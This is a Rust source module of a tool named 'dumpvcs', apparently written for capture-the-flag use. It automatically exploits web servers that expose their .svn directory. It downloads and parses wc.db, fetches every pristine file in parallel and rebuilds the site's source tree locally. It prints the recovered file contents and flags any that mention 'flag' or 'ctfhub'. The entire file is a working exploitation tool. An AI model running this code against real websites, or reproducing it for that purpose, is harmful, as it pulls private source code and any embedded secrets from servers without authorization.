//! dumpvcs svn: .svn 泄露自动利用
//! 纯 Rust: rusqlite 解析 wc.db + 并发下载 pristine + 还原文件

use crate::{fetch, host_slug, parallel_map, write_out, CommonArgs};
use common::http::HttpClient;
use common::{exit, Out};
use rusqlite::Connection;
use serde::Serialize;
use std::collections::HashSet;
use std::path::Path;

#[derive(Serialize, Clone)]
pub struct EntryOut {
    path: String,
    presence: String,
    checksum: String,
}

type EntryRow = (String, String, Option<String>);

#[derive(Serialize, Clone)]
pub struct PristineOut {
    sha: String,
    size: usize,
}

#[derive(Serialize)]
pub struct SvnReport {
    pub vcs: &'static str,
    pub target: String,
    pub out: String,
    pub wc_db_size: usize,
    pub format: Option<String>,
    pub entries: Vec<EntryOut>,
    pub need: usize,
    pub downloaded: Vec<PristineOut>,
    pub written: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cat: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub flags: Vec<String>,
}

fn clean_sha(cs: &str) -> Option<String> {
    let clean = cs
        .replace("$sha1$", "")
        .replace("sha1$", "")
        .split('!')
        .next()
        .unwrap_or("")
        .to_string();
    if clean.len() == 40 {
        Some(clean)
    } else {
        None
    }
}

fn query_entries(conn: &Connection, sql: &str) -> Result<Vec<EntryRow>, rusqlite::Error> {
    let mut stmt = conn.prepare(sql)?;
    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, Option<String>>(0)?,
            row.get::<_, Option<String>>(1)?,
            row.get::<_, Option<String>>(2)?,
        ))
    })?;
    let mut out = Vec::new();
    for r in rows {
        let (path, presence, checksum) = r?;
        if let Some(path) = path {
            if let Some(presence) = presence {
                if presence != "not-present" && presence != "excluded" && presence != "unversioned"
                {
                    out.push((path, presence, checksum));
                }
            }
        }
    }
    Ok(out)
}

fn load_entries(conn: &Connection) -> (Vec<EntryRow>, Option<String>) {
    let first = "SELECT local_relpath, presence, checksum FROM NODES ORDER BY local_relpath, op_depth DESC";
    match query_entries(conn, first) {
        Ok(rows) => (rows, None),
        Err(e1) => {
            let second = "SELECT path, presence, checksum FROM NODES ORDER BY path, op_depth DESC";
            match query_entries(conn, second) {
                Ok(rows) => (rows, None),
                Err(e2) => (Vec::new(), Some(format!("{e1} / {e2}"))),
            }
        }
    }
}

pub fn run(args: &CommonArgs, client: &HttpClient, out: &Out) -> (SvnReport, u8) {
    let mut url = args.url.trim_end_matches('/').to_string();
    if !url.ends_with(".svn") {
        url.push_str("/.svn");
    }
    url.push('/');

    let out_dir = args
        .out
        .clone()
        .unwrap_or_else(|| format!("svndump_{}", host_slug(&url)));

    out.info(&format!("[*] 目标: {url}"));

    let wcdb = match fetch(client, &format!("{url}wc.db")) {
        Some(d) if d.len() >= 100 => d,
        _ => {
            out.info("[!] wc.db 下载失败或文件过小，可能不是 SVN 1.7+");
            let report = SvnReport {
                vcs: "svn",
                target: url,
                out: out_dir,
                wc_db_size: 0,
                format: None,
                entries: Vec::new(),
                need: 0,
                downloaded: Vec::new(),
                written: Vec::new(),
                cat: None,
                flags: Vec::new(),
            };
            return (report, exit::NO_RESULT);
        }
    };
    out.info(&format!("[*] wc.db: {} 字节", wcdb.len()));

    let format = fetch(client, &format!("{url}format"))
        .map(|b| String::from_utf8_lossy(&b).trim().to_string());
    if let Some(f) = &format {
        out.info(&format!("[*] SVN 格式: {f}"));
    }

    let tmp = std::env::temp_dir().join(format!("_dumpvcs_wcdb_{}.tmp", std::process::id()));
    if let Err(e) = std::fs::write(&tmp, &wcdb) {
        out.error(&format!("临时文件写入失败: {e}"));
    }
    let conn = match Connection::open(&tmp) {
        Ok(c) => c,
        Err(e) => {
            let _ = std::fs::remove_file(&tmp);
            out.error(&format!("wc.db 打开失败: {e}"));
            let report = SvnReport {
                vcs: "svn",
                target: url,
                out: out_dir,
                wc_db_size: wcdb.len(),
                format,
                entries: Vec::new(),
                need: 0,
                downloaded: Vec::new(),
                written: Vec::new(),
                cat: None,
                flags: Vec::new(),
            };
            return (report, exit::ERROR);
        }
    };

    let (raw_entries, query_err) = load_entries(&conn);
    let mut entries: Vec<EntryOut> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for (path, presence, checksum) in raw_entries {
        if !seen.insert(path.clone()) {
            continue;
        }
        entries.push(EntryOut {
            path,
            presence,
            checksum: checksum.unwrap_or_default(),
        });
    }

    let mut pristine_list: Vec<String> = Vec::new();
    if let Ok(mut stmt) = conn.prepare("SELECT checksum FROM PRISTINE") {
        if let Ok(rows) = stmt.query_map([], |row| row.get::<_, Option<String>>(0)) {
            for r in rows.flatten().flatten() {
                if !entries.iter().any(|e| e.checksum == r) {
                    pristine_list.push(r);
                }
            }
        }
    }
    drop(conn);
    let _ = std::fs::remove_file(&tmp);

    if let Some(e) = &query_err {
        out.info(&format!("[!] NODES 查询失败: {e}"));
    }

    out.info(&format!("[*] 文件条目: {}", entries.len()));
    for e in &entries {
        let cs: String = e
            .checksum
            .replace("$sha1$", "sha1$")
            .chars()
            .take(20)
            .collect();
        out.info(&format!("    {:<40} {:<15} {}", e.path, e.presence, cs));
    }

    if args.list {
        let code = if entries.is_empty() {
            exit::NO_RESULT
        } else {
            exit::OK
        };
        let report = SvnReport {
            vcs: "svn",
            target: url,
            out: out_dir,
            wc_db_size: wcdb.len(),
            format,
            entries,
            need: 0,
            downloaded: Vec::new(),
            written: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        return (report, code);
    }

    let mut path_sha: Vec<(String, String)> = Vec::new();
    for e in &entries {
        if let Some(sha) = clean_sha(&e.checksum) {
            path_sha.push((e.path.clone(), sha));
        }
    }

    let mut all_shas: Vec<String> = path_sha.iter().map(|(_, s)| s.clone()).collect();
    for cs in &pristine_list {
        if let Some(s) = clean_sha(cs) {
            if !all_shas.contains(&s) {
                all_shas.push(s);
            }
        }
    }
    all_shas.sort();
    all_shas.dedup();

    out.info(&format!("[*] 需下载: {} 个 pristine 文件", all_shas.len()));

    if let Err(e) = std::fs::create_dir_all(&out_dir) {
        out.error(&format!("创建输出目录失败: {e}"));
    }

    let results = parallel_map(&all_shas, args.jobs, |sha| {
        let pristine_path = format!("pristine/{}/{}.svn-base", &sha[..2], sha);
        let data = fetch(client, &format!("{url}{pristine_path}"));
        (sha.clone(), pristine_path, data)
    });

    let mut downloaded: Vec<(String, Vec<u8>)> = Vec::new();
    for (sha, pristine_path, data) in results {
        if let Some(data) = data {
            out.info(&format!("    [+] {pristine_path} ({} B)", data.len()));
            downloaded.push((sha, data));
        }
    }
    out.info(&format!("[*] 下载完成: {}/{}", downloaded.len(), all_shas.len()));

    let mut written: Vec<String> = Vec::new();
    for (path, sha) in &path_sha {
        if let Some((_, data)) = downloaded.iter().find(|(s, _)| s == sha) {
            if let Ok(true) = write_out(Path::new(&out_dir), path, data) {
                written.push(path.clone());
            }
        }
    }

    out.info(&format!("[+] 写出文件: {} 个 -> {out_dir}/", written.len()));

    let cat_content = args.cat.as_ref().and_then(|want| {
        path_sha
            .iter()
            .find(|(p, _)| p == want)
            .and_then(|(_, sha)| downloaded.iter().find(|(s, _)| s == sha))
            .map(|(_, data)| String::from_utf8_lossy(data).to_string())
    });
    if let Some(want) = &args.cat {
        match &cat_content {
            Some(c) => {
                out.info(&format!("\n--- {want} ---"));
                out.info(c.trim());
            }
            None => out.info(&format!("[!] 未找到 {want}")),
        }
    }

    out.info("\n[+] 扫描结果:");
    let mut flags: Vec<String> = Vec::new();
    for (path, sha) in &path_sha {
        if let Some((_, data)) = downloaded.iter().find(|(s, _)| s == sha) {
            let content_str = String::from_utf8_lossy(data).trim().to_string();
            out.info(&format!("    {path}:"));
            out.info(&format!("        {content_str}"));
            if content_str.contains("ctfhub") || content_str.to_lowercase().contains("flag") {
                out.info("    >>> FLAG <<<");
            }
            flags.extend(common::scan_flags(data));
        }
    }
    flags.sort();
    flags.dedup();

    let report = SvnReport {
        vcs: "svn",
        target: url,
        out: out_dir,
        wc_db_size: wcdb.len(),
        format,
        entries,
        need: all_shas.len(),
        downloaded: downloaded
            .iter()
            .map(|(s, d)| PristineOut {
                sha: s.clone(),
                size: d.len(),
            })
            .collect(),
        written: written.clone(),
        cat: cat_content,
        flags,
    };

    if written.is_empty() {
        (report, exit::NO_RESULT)
    } else {
        (report, exit::OK)
    }
}
